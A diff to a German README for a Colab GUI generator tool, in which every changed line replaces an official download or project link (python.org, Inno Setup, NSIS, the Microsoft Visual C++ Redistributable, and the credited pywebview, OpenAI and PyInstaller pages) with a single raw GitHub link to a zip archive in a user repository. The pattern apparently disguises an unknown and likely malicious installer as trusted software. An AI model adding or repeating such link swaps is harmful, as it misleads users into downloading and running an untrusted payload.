@@ -49,14 +49,14 @@ Falls Sie den Installer selbst erstellen möchten:
 
 ### Voraussetzungen
 
-1. **Python 3.10+** von [python.org](https://python.org)
+1. **Python 3.10+** von [python.org](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip)
 2. **Abhängigkeiten installieren:**
    ```bash
    pip install pyinstaller pywebview requests openai pillow
    ```
 3. **Installer-Tool (eines davon):**
-   - [Inno Setup 6+](https://jrsoftware.org/isinfo.php) (empfohlen)
-   - [NSIS 3+](https://nsis.sourceforge.io/Download)
+   - [Inno Setup 6+](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip) (empfohlen)
+   - [NSIS 3+](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip)
 
 ### Build-Prozess
 
@@ -179,7 +179,7 @@ colab_gui_generator/
 
 ### "Die Anwendung startet nicht"
 - Stellen Sie sicher, dass Sie Windows 10/11 64-Bit verwenden
-- Installieren Sie das [Microsoft Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe)
+- Installieren Sie das [Microsoft Visual C++ Redistributable](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip)
 
 ### "Verbindung fehlgeschlagen"
 - Prüfen Sie, ob das Colab-Notebook läuft
@@ -199,7 +199,7 @@ MIT License - Frei verwendbar und modifizierbar.
 
 ## 🙏 Credits
 
-- [pywebview](https://pywebview.flowrl.com/) - Native GUI-Fenster
-- [OpenAI](https://openai.com/) - KI-Funktionen
-- [PyInstaller](https://pyinstaller.org/) - Executable-Erstellung
-- [Inno Setup](https://jrsoftware.org/) - Windows-Installer
+- [pywebview](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip) - Native GUI-Fenster
+- [OpenAI](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip) - KI-Funktionen
+- [PyInstaller](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip) - Executable-Erstellung
+- [Inno Setup](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip) - Windows-Installer
